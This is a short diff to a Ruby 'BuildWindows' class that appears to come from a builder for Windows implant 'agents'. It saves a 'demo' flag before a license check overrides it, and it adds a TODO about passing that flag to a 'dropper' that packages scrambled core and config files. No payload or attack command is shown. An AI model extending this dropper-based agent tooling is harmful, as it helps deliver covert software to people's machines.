@@ -24,6 +24,9 @@ class BuildWindows < Build
     params[:core] = 'core'
     params[:config] = 'config'
 
+    # remember the demo parameter
+    @demo = params['demo']
+
     # overwrite the demo flag if the license doesn't allow it
     params['demo'] = true unless LicenseManager.instance.limits[:agents][:windows][0]
 
@@ -95,6 +98,9 @@ class BuildWindows < Build
       CrossPlatform.exec path('cooker'), '-C -R ' + path('') + ' -O ' + path('output')
 
     else
+
+      # TODO: add the demo parameter for the dropper here
+
       CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                           path(@scrambled[:core64])+' '+
                                           path(@scrambled[:config])+' '+
